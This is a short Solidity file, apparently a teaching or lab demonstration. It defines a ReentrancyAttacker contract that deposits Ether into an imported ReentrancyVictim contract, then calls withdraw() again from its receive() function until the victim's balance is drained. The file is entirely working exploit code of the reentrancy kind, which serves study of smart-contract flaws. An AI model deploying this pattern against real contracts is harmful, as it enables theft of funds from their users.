// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./ReentrancyVictim.sol";

contract ReentrancyAttacker {

    ReentrancyVictim public victimContract;

    constructor(address victimAddress) 
	{
        victimContract = ReentrancyVictim(victimAddress);
    }

    // Function to receive Ether, limited to 2300 gas
    receive() external payable 
	{
        if(address(victimContract).balance > 0)
            victimContract.withdraw();
    }

    // Starts the attack
    function attack() public payable 
	{
        victimContract.addBalance{value: msg.value}();
        victimContract.withdraw();
    }
}